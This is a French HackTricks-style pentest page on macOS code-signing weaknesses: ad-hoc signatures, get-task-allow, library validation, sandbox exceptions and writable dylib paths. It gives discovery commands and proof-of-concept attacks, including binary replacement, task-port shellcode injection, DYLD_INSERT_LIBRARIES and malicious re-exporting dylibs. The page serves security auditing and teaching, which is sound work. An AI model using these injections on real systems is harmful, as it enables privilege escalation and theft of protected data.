# Faiblesses de la signature de code macOS et échappements du Sandbox

{{#include ../../../banners/hacktricks-training.md}}

## Binaires signés Ad-Hoc

### Informations de base

La **signature Ad-Hoc** (`CS_ADHOC`) crée une signature de code **sans chaîne de certificats** — il s'agit d'un hash du code, sans vérification de l'identité du développeur. L'origine du binaire ne peut être attribuée à aucun développeur ni à aucune organisation.<sup>[[1]](#references)[[4]](#references)</sup>

Sur les Mac équipés d'Apple Silicon, tous les exécutables nécessitent au minimum une signature Ad-Hoc. Cela signifie que vous trouverez des signatures Ad-Hoc sur de nombreux outils de développement, packages Homebrew et utilitaires tiers.

### Pourquoi c'est important

- **Aucune identité vérifiable** — le binaire peut être remplacé sans être détecté par des vérifications fondées sur l'identité
- Les binaires Ad-Hoc tiers situés dans des **positions privilégiées** (FDA, daemon, helpers) sont des cibles prioritaires
- Dans certaines configurations, les signatures Ad-Hoc peuvent **ne pas être vérifiées aussi strictement** que le code signé par un développeur
- Les binaires signés Ad-Hoc qui disposent de **TCC grants** sont particulièrement précieux — les grants persistent même si le contenu du binaire est modifié (selon la manière dont TCC a indexé le grant)

### Découverte
```bash
# Find ad-hoc signed binaries
find /usr/local /opt /Applications -type f -perm +111 -exec sh -c '
flags=$(codesign -dvv "{}" 2>&1 | grep "CodeDirectory flags")
echo "$flags" | grep -q "adhoc" && echo "AD-HOC: {}"
' \; 2>/dev/null

# Check a specific binary
codesign -dv --verbose=4 /path/to/binary 2>&1 | grep -E "Signature|flags|Authority"
# Ad-hoc shows: "Signature=adhoc" and no Authority lines
```
### Attaque : Binary Replacement
```bash
# If an ad-hoc signed daemon binary is in a writable location:
# 1. Check the binary's current capabilities
codesign -d --entitlements - /path/to/target 2>&1

# 2. Note its TCC grants in the database
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT service, auth_value FROM access WHERE client LIKE '%target%';"

# 3. Replace the binary (if location is writable)
cp /tmp/malicious-binary /path/to/target

# 4. Re-sign with ad-hoc signature (mimics the original)
codesign -s - /path/to/target

# 5. On next launch, the daemon runs your code with the original's TCC grants
# (This works when TCC keyed the grant by path rather than code signature)
```
---

## Processus débogables (get-task-allow)

### Informations de base

L’entitlement **`com.apple.security.get-task-allow`** (ou le flag **`CS_GET_TASK_ALLOW`**) permet à **n’importe quel processus de s’attacher comme debugger**, de lire la mémoire, de modifier les registres, d’injecter du code et de contrôler l’exécution.<sup>[[3]](#references)</sup>

Cela est prévu **uniquement pour les builds de développement**. Cependant, certains binaires tiers sont distribués avec cet entitlement en production.

> [!CAUTION]
> Un binaire de production avec `get-task-allow` constitue une **primitive d’exploitation immédiate**. N’importe quel processus local peut appeler `task_for_pid()`, obtenir le port de tâche Mach de la cible et injecter du code arbitraire qui s’exécute avec les entitlements, les autorisations TCC et le contexte de sécurité de la cible.

### Découverte
```bash
# Find debuggable binaries
find /Applications /usr/local -type f -perm +111 -exec sh -c '
codesign -d --entitlements - "{}" 2>&1 | grep -q "get-task-allow.*true" && echo "DEBUGGABLE: {}"
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path, privileged FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'get_task_allow_signature'
ORDER BY e.privileged DESC;"
```
### Attack: Task Port Injection
```c
#include <mach/mach.h>
#include <mach/mach_vm.h>

// Get the target's task port (requires get-task-allow on target)
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);

if (kr == KERN_SUCCESS) {
// Allocate memory in target process
mach_vm_address_t addr = 0;
mach_vm_allocate(task, &addr, shellcode_size, VM_FLAGS_ANYWHERE);

// Write shellcode into target
mach_vm_write(task, addr, (vm_offset_t)shellcode, shellcode_size);

// Make it executable
mach_vm_protect(task, addr, shellcode_size, FALSE,
VM_PROT_READ | VM_PROT_EXECUTE);

// Create a remote thread to execute the shellcode
// The shellcode runs with ALL of the target's entitlements and TCC grants
}
```
---

## Suppression de la Library Validation à l’exécution

L’entitlement privé **`com.apple.private.security.clear-library-validation`** ne désactive pas la library validation au lancement du process. Il permet plutôt au process d’appeler `csops(..., CS_OPS_CLEAR_LV, ...)` sur lui-même à l’exécution. XNU efface alors `CS_REQUIRE_LV | CS_FORCED_LV`, à condition que l’appelant possède l’entitlement et satisfasse aux vérifications supplémentaires du handler. Par conséquent, un process peut devenir une cible viable pour l’injection de library uniquement après avoir atteint le code path qui efface la library validation.<sup>[[4]](#references)[[5]](#references)</sup>

### La combinaison fatale

Lorsqu’un binary possède **les deux**:<sup>[[3]](#references)</sup>
- `com.apple.security.cs.disable-library-validation` (charge n’importe quelle dylib)
- `com.apple.security.cs.allow-dyld-environment-variables` (accepte les variables d’environnement DYLD)

Il s’agit d’une **primitive garantie d’injection de code** — `DYLD_INSERT_LIBRARIES` fonctionne parfaitement.

### Découverte
```bash
# Find binaries with the deadly combo
find /Applications -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "disable-library-validation.*true" && \
echo "$ents" | grep -q "allow-dyld-environment.*true" && \
echo "INJECTABLE: {}"
' \; 2>/dev/null

# Using the scanner (both flags)
sqlite3 /tmp/executables.db "
SELECT path, privileged, tccPermsStr FROM executables
WHERE noLibVal = 1 AND allowDyldEnv = 1
ORDER BY privileged DESC;"
```
### Attack: DYLD_INSERT_LIBRARIES Injection
```bash
# 1. Create the injection dylib
cat > /tmp/inject.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void injected(void) {
// This runs BEFORE main() in the target's process
// We inherit ALL of the target's:
// - Entitlements
// - TCC grants (camera, mic, FDA, etc.)
// - Sandbox exceptions
// - Mach port rights

FILE *f = fopen("/tmp/injected_proof.txt", "w");
fprintf(f, "Running as PID %d with target's privileges\n", getpid());
fclose(f);

// Example: if target has camera TCC, we can now capture video
// Example: if target has FDA, we can read any file
}
EOF

# 2. Compile the dylib
cc -shared -o /tmp/inject.dylib /tmp/inject.c

# 3. Inject into the target
DYLD_INSERT_LIBRARIES=/tmp/inject.dylib /path/to/noLibVal-dyldEnv-binary

# 4. Verify injection
cat /tmp/injected_proof.txt
```
---

## Exceptions temporaires du Sandbox

### Comment elles affaiblissent le Sandbox

Les exceptions temporaires du Sandbox (`com.apple.security.temporary-exception.*`) créent des brèches dans l’App Sandbox :<sup>[[2]](#references)</sup>

| Exception | Ce qu’elle permet |
|---|---|
| `temporary-exception.mach-lookup.global-name` | Se connecter aux services XPC/Mach disponibles à l’échelle du système |
| `temporary-exception.files.absolute-path.read-write` | Lire/écrire des fichiers en dehors du conteneur de l’application |
| `temporary-exception.iokit-user-client-class` | Ouvrir des connexions user-client IOKit |
| `temporary-exception.shared-preference.read-only` | Lire les préférences d’autres applications |
| `temporary-exception.files.home-relative-path.read-write` | Accéder aux chemins relatifs à `~` |

### Exceptions Mach-Lookup = Primitive d’évasion du Sandbox

L’exception la plus dangereuse est **mach-lookup** — elle permet à une application sandboxée de communiquer avec des daemons privilégiés :
```bash
# Find apps with mach-lookup exceptions
find /Applications -name "*.app" -exec sh -c '
binary="$1/Contents/MacOS/$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)"
[ -f "$binary" ] && {
ents=$(codesign -d --entitlements - "$binary" 2>&1)
echo "$ents" | grep -q "mach-lookup" && {
count=$(echo "$ents" | grep -c "mach-lookup")
echo "[$count exceptions] $(basename "$1")"
}
}
' _ {} \; 2>/dev/null | sort -rn
```
### Attaque : Sandbox Escape via Mach-Lookup
```
1. Compromise sandboxed app (renderer exploit, malicious document, etc.)
2. Read entitlements to discover mach-lookup exceptions
3. For each reachable service:
a. Connect via NSXPCConnection
b. Discover the service's protocol (class-dump, strings)
c. Fuzz each exposed method
4. Find a vulnerability in a privileged daemon
5. Exploit → code execution in the daemon's context (outside sandbox)
```
---

## Entitlements privés Apple

### Ce qu’ils sont

Les entitlements préfixés par `com.apple.private.*` permettent d’accéder aux **Apple-internal APIs** qui ne sont ni documentées ni disponibles pour les développeurs tiers. Les binaires tiers disposant d’entitlements privés les ont obtenus via un certificat d’entreprise, MDM ou une distribution hors App Store.

### Entitlements privés dangereux

| Entitlement | Capability |
|---|---|
| `com.apple.private.tcc.manager` | Lecture/écriture complète de la base de données TCC |
| `com.apple.private.tcc.allow` | Accès à des services TCC spécifiques |
| `com.apple.private.security.no-sandbox` | Exécution sans sandbox |
| `com.apple.private.iokit` | Accès direct aux drivers IOKit |
| `com.apple.private.kernel.\*` | Accès aux interfaces du kernel |
| `com.apple.private.xpc.launchd.job-label` | Enregistrement/gestion des jobs launchd |
| `com.apple.rootless.install` | Écriture dans des chemins protégés par SIP |

### Découverte
```bash
# Find third-party binaries with private entitlements
find /Applications /usr/local -type f -perm +111 -exec sh -c '
ents=$(codesign -d --entitlements - "{}" 2>&1)
echo "$ents" | grep -q "com.apple.private" && {
echo "=== {} ==="
echo "$ents" | grep "com.apple.private" | head -10
}
' \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE privateEnts = 1 AND isAppleBin = 0
ORDER BY privileged DESC;"
```
---

## Profils Sandbox personnalisés

### Ce qu'ils sont

Les binaires peuvent intégrer des **profils Sandbox personnalisés** écrits en SBPL (Seatbelt Profile Language). Ces profils peuvent être plus restrictifs OU **plus permissifs** que l'App Sandbox par défaut.

### Auditer les profils personnalisés
```bash
# Find custom sandbox profiles
find /Applications /System -name "*.sb" -o -name "*.sbpl" 2>/dev/null

# Dangerous SBPL rules to flag during audit:
# (allow file-write*)         — Write to ANY file
# (allow process-exec*)       — Execute ANY process
# (allow mach-lookup*)        — Connect to ANY Mach service
# (allow network*)            — Full network access
# (allow iokit*)              — Full IOKit access
# (allow file-read*)          — Read ANY file

# Example: Audit a sandbox profile for overly permissive rules
cat /path/to/custom.sb | grep "(allow" | sort -u
```
---

## Chemins de bibliothèques accessibles en écriture

### Ce que c’est

Lorsqu’un binaire charge une bibliothèque dynamique depuis un chemin sur lequel l’utilisateur actuel peut **écrire**, la bibliothèque peut être remplacée par du code malveillant.

### Découverte
```bash
# Using the scanner — find privileged binaries loading from writable paths
sqlite3 /tmp/executables.db "
SELECT e.path, e.privileged
FROM executables e
JOIN executable_capabilities ec ON e.id = ec.executable_id
JOIN capabilities c ON ec.capability_id = c.id
WHERE c.name = 'execs_writable_path'
ORDER BY e.privileged DESC
LIMIT 30;"

# Manual check: list library dependencies and check writability
otool -L /path/to/binary | awk '{print $1}' | while read lib; do
[ -f "$lib" ] && [ -w "$lib" ] && echo "WRITABLE: $lib"
done
```
### Attaque: Dylib Replacement
```bash
# 1. Find the writable library
otool -L /path/to/target-daemon | grep "/usr/local\|/opt\|Library"

# 2. Back up the original
cp /path/to/writable.dylib /tmp/original.dylib

# 3. Create a replacement that re-exports the original
cat > /tmp/evil.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void evil(void) {
system("id > /tmp/escalated.txt");
}
EOF
cc -shared -o /tmp/evil.dylib /tmp/evil.c \
-Wl,-reexport_library,/tmp/original.dylib

# 4. Replace the library
cp /tmp/evil.dylib /path/to/writable.dylib

# 5. When the daemon restarts, it loads the evil dylib with daemon privileges
```
## References

- [1] [Apple Developer — Guide de signature de code](https://developer.apple.com/library/archive/technotes/tn2206/_index.html)
- [2] [Apple Developer — App Sandbox](https://developer.apple.com/library/archive/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html)
- [3] [Apple Developer — Droits](https://developer.apple.com/documentation/bundleresources/entitlements)
- [4] [XNU — `bsd/sys/codesign.h` (opérations `CS_OPS_*` et `CLEAR_LV_ENTITLEMENT`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/sys/codesign.h)
- [5] [XNU — `bsd/kern/kern_proc.c` (gestionnaire de `csops` / `CS_OPS_CLEAR_LV`)](https://github.com/apple-oss-distributions/xnu/blob/main/bsd/kern/kern_proc.c)
{{#include ../../../banners/hacktricks-training.md}}
